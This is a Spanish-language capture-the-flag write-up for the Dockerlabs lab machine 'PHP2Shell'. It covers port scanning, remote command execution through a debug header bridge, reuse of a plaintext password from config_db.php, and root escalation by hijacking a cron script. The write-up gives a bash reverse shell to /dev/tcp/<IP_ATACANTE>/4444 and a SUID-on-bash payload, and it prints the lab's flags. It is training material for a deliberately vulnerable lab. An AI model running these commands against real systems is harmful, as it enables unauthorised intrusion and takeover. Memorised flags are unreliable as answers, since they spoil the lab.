# Writeup Oficial: PHP2Shell (Dockerlabs)

* **Máquina:** PHP2Shell
* **Dificultad:** Media
* **Sistema Operativo:** Linux (Ubuntu 22.04 LTS)
* **Dominio:** `php2shell.dl`
* **Vulnerabilidades y vectores:**
  * Enumeración de recursos ocultos (`robots.txt`, `/legacy/debug-note.txt`).
  * Ejecución de comandos mediante Legacy Debug Bridge con validación de PID (`api.php`).
  * Movimiento lateral por reutilización de credenciales internas (`config_db.php` y `dev_notes.txt`).
  * Escalada de privilegios a `root` mediante secuestro de tarea programada de mantenimiento (`cron` y `/opt/backup/rotate.sh`).
* **Flags:**
  * **Intermedia:** `/opt/backup/notes.txt`
  * **User:** `/home/mario/user.txt`
  * **Root:** `/root/root.txt`

---

## 1. Despliegue del Laboratorio

Desplegamos el laboratorio ejecutando el script oficial con privilegios de administrador:

```bash
sudo bash auto_deploy.sh
```

El script detecta la subred, levanta el contenedor e inserta automáticamente la entrada correspondiente en `/etc/hosts` vinculando la IP asignada con el dominio `php2shell.dl`.

---

## 2. Fase de Reconocimiento y Enumeración

### 2.1. Escaneo de Puertos con Nmap

Lanzamos un escaneo exhaustivo sobre los 65.535 puertos utilizando el dominio `php2shell.dl`:

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn php2shell.dl -oG allPorts
```

Identificamos el puerto **80/TCP** abierto. Seguidamente, realizamos un escaneo de versiones y scripts de reconocimiento:

```bash
nmap -sCV -p80 php2shell.dl -oN targeted
```

**Salida obtenida:**
```text
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: PHP2Shell Cloud Platform - Enterprise Core
```

### 2.2. Enumeración Web

Accedemos a `http://php2shell.dl` a través del navegador o con `curl`:

```bash
curl -I http://php2shell.dl/
```

**Respuesta HTTP:**
```text
HTTP/1.1 200 OK
Date: Wed, 18 Nov 2026 15:40:00 GMT
Server: Apache/2.4.52 (Ubuntu)
X-Powered-By: PHP/8.1.2-1ubuntu2.28
Content-Type: text/html; charset=UTF-8
```

Consultamos el endpoint `status.php`:

```bash
curl -s http://php2shell.dl/status.php
```

```text
===========================================
   PHP2Shell Enterprise Core Service v1.0   
===========================================
Host: php2shell.dl
Server Software: Apache/2.4.52 (Ubuntu)
PHP Core Version: 8.1.2-1ubuntu2.28
PHP SAPI: apache2handler
Zend Engine: 4.1.2
System Time: 2026-11-18 15:40:02
Health: OK (Memory Usage: 2.14 MB)
===========================================
```

---

## 3. Descubrimiento del Vector de Intrusión (Legacy Bridge)

### 3.1. Enumeración de archivos y directorios estándar

Comprobamos si el servidor cuenta con directivas en `robots.txt`:

```bash
curl -s http://php2shell.dl/robots.txt
```

**Salida:**
```text
User-agent: *
Disallow: /legacy/
```

### 3.2. Inspección del recurso `/legacy/`

Al examinar la ruta `/legacy/` o realizar fuzzing sobre ella (`gobuster dir -u http://php2shell.dl/legacy/ -w /usr/share/wordlists/dirb/common.txt`), localizamos el archivo `debug-note.txt`:

```bash
curl -s http://php2shell.dl/legacy/debug-note.txt
```

**Contenido revelado:**
```text
=== PHP2Shell Internal Operations - Legacy Maintenance Bridge ===
Notice for DevOps / Support Staff:
The legacy maintenance bridge is available at /api.php for worker-level diagnostics.

Security requirements:
- Command header: X-Debug-Bridge: <command>
- Token header:   X-Debug-Token: <token>

Note: For security during rolling restarts, the token is dynamic and matches the active Apache worker process ID (PID).
You can inspect the current worker PID via the diagnostic endpoint: /api.php?action=diagnostic
```

La nota nos indica que:
1. En `/api.php` existe un puente de depuración que ejecuta comandos pasados en la cabecera `X-Debug-Bridge`.
2. Para autenticarse, requiere la cabecera `X-Debug-Token`.
3. El valor del token es el **PID** del proceso worker de Apache, el cual está expuesto de forma legítima en `/api.php?action=diagnostic`.

---

## 4. Explotación: RCE y Reverse Shell (www-data)

### 4.1. Obtención del token dinámico (PID)

Consultamos la telemetría del worker en `/api.php?action=diagnostic`:

```bash
curl -s "http://php2shell.dl/api.php?action=diagnostic" | jq .
```

**Salida JSON:**
```json
{
  "status": "online",
  "php_version": "8.1.2-1ubuntu2.28",
  "sapi_name": "apache2handler",
  "memory_limit": "128M",
  "memory_allocated": 2097152,
  "memory_peak": 2097152,
  "zend_engine": "4.1.2",
  "worker_pid": 28,
  "server_software": "Apache/2.4.52"
}
```

El `worker_pid` actual es `28`.

### 4.2. Ejecución remota de comandos

Probamos el puente enviando el comando `id` con el token correspondiente:

```bash
curl -s -H "X-Debug-Bridge: id" -H "X-Debug-Token: 28" http://php2shell.dl/api.php | jq .
```

**Respuesta:**
```json
{
  "status": "success",
  "bridge": "legacy_debug_bridge",
  "output": "uid=33(www-data) gid=33(www-data) groups=33(www-data)",
  "code": 0
}
```

Confirmamos la ejecución remota de código con privilegios de `www-data`.

### 4.3. Entablado de Reverse Shell

En nuestra máquina atacante iniciamos un listener en el puerto 4444:

```bash
nc -nlvp 4444
```

Lanzamos la Reverse Shell (ajustando `<IP_ATACANTE>` y el `PID` obtenido):

```bash
PID=$(curl -s "http://php2shell.dl/api.php?action=diagnostic" | jq -r '.worker_pid')

curl -s -H "X-Debug-Bridge: bash -c 'bash -i >& /dev/tcp/<IP_ATACANTE>/4444 0>&1'" \
        -H "X-Debug-Token: $PID" \
        http://php2shell.dl/api.php
```

Recibimos la conexión interactiva como `www-data`. Estabilizamos la TTY:

```bash
script /dev/null -c bash
# Presionar Ctrl+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
```

Verificamos el sistema operativo y kernel:

```bash
uname -a
# Linux 85baa29864d3 6.18.12+kali-amd64 #1 SMP PREEMPT_DYNAMIC x86_64 x86_64 x86_64 GNU/Linux
```

---

## 5. Movimiento Lateral: www-data -> mario

Revisamos el directorio raíz del servidor web `/var/www/`:

```bash
cd /var/www
ls -la
```

Encontramos dos archivos de interés para el equipo de desarrollo:
1. `config_db.php`
2. `dev_notes.txt`

Inspeccionamos su contenido:

```bash
cat dev_notes.txt
```
```text
[INTERNAL DEVELOPER NOTE]
Recordatorio: La credencial del usuario local mario coincide con el acceso a la base de datos definido en config_db.php.
```

```bash
cat config_db.php
```
```php
<?php
// Internal database & system management
$db_host = "127.0.0.1";
$db_user = "mario";
$db_pass = "mario_chocolate!";
$db_name = "corp_cloud";
?>
```

Comprobamos los usuarios con shell en `/etc/passwd`:

```bash
grep bash /etc/passwd
# root:x:0:0:root:/root:/bin/bash
# mario:x:1000:1000::/home/mario:/bin/bash
```

Cambiamos al usuario `mario` utilizando la contraseña encontrada (`mario_chocolate!`):

```bash
su - mario
# Introducir contraseña: mario_chocolate!
```

Comprobamos nuestra identidad y capturamos la **User Flag**:

```bash
whoami
# mario

cat /home/mario/user.txt
```

> **User Flag:** `dl{m4r10_l3g4cy_d3bug_pwn3d_4f7e}`

---

## 6. Escalada de Privilegios: mario -> root

### 6.1. Descubrimiento de la Flag Intermedia y Tarea Programada

Al enumerar el directorio `/opt/` encontramos la carpeta `/opt/backup/`:

```bash
cd /opt/backup
ls -la
```

**Salida:**
```text
total 16
drwxr-xr-x 2 mario mario 4096 Nov 18 15:38 .
drwxr-xr-x 3 root  root  4096 Nov 18 15:38 ..
-rw-r--r-- 1 mario mario   40 Nov 18 15:38 notes.txt
-rwxr-xr-x 1 mario mario  110 Nov 18 15:38 rotate.sh
```

Leemos `notes.txt`:

```bash
cat notes.txt
```

> **Flag Intermedia:** `dl{l3gacy_cr0n_m41nt3n4nc3_fl4g_88a1}`

### 6.2. Auditoría de Tareas Programadas (Cron)

Inspeccionamos las tareas de `cron` del sistema:

```bash
cat /etc/cron.d/backup_rotate
```

**Salida:**
```text
* * * * * root /opt/backup/rotate.sh
```

Observamos que:
* El script `/opt/backup/rotate.sh` es ejecutado **cada minuto por el usuario `root`**.
* Como verificamos en el `ls -la`, el archivo `/opt/backup/rotate.sh` le pertenece a `mario` y tiene **permisos de escritura** (`-rwxr-xr-x 1 mario mario`).

### 6.3. Secuestro del Script de Mantenimiento

Añadimos una instrucción a `/opt/backup/rotate.sh` para asignar el bit SUID al binario `/bin/bash`:

```bash
echo "chmod u+s /bin/bash" >> /opt/backup/rotate.sh
```

Esperamos hasta un minuto a que la tarea programada se ejecute bajo el contexto de `root`. Comprobamos si el bit SUID fue aplicado:

```bash
ls -l /bin/bash
# -rwsr-xr-x 1 root root /bin/bash
```

Ejecutamos `/bin/bash` manteniendo los privilegios efectivos (`-p`):

```bash
/bin/bash -p
```

Verificamos la identidad de superusuario:

```bash
whoami
# root

id
# uid=1000(mario) gid=1000(mario) euid=0(root) groups=1000(mario)
```

Capturamos la **Root Flag**:

```bash
cat /root/root.txt
```

> **Root Flag:** `dl{r00t_sCH3dul3r_3sc4l4t10n_99c3}`

¡Máquina resuelta de manera limpia, transparente y verosímil!
